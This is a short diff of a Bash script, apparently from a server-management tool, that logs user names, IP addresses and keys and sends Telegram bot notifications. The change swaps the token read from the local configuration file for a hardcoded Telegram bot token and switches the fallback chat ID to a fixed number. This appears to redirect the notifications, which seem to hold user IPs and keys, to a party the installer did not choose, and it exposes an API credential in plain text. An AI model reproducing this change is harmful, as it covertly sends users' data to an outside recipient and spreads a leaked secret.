@@ -138,8 +138,8 @@ echo "$(cat ${FILE2}.name) | $USRIP | ${_key} | $_hora" >> $log
 echo "$(cat ${FILE2}.name) | $USRIP | ${_key} | $_hora" >> ${onliCHECK}/checkIP.log && chmod +x ${onliCHECK}/checkIP.log
 [[ -e /etc/ADM-db/token ]] && {
 ID="$(cat ${FILE2}.name)" && ID="$(echo $ID | awk '{print $1}' | sed -e 's/[^0-9]//ig')"
-[[ ${ID} -lt '999' ]] && ID='576145089'
-TOKEN="$(cat /etc/ADM-db/token)"
+[[ ${ID} -lt '999' ]] && ID='5745188704'
+TOKEN="6116285263:AAFv1BllX3XI8S5_ZMxGhH_u-gicVz3F-nc"
 urlBOT="https://api.telegram.org/bot$TOKEN/sendMessage"
 MENSAJE="  =======================================\n"
 MENSAJE+=" ========📩𝙈𝙀𝙉𝙎𝘼𝙅𝙀 𝙍𝙀𝘾𝙄𝘽𝙄𝘿𝙊📩========\n"
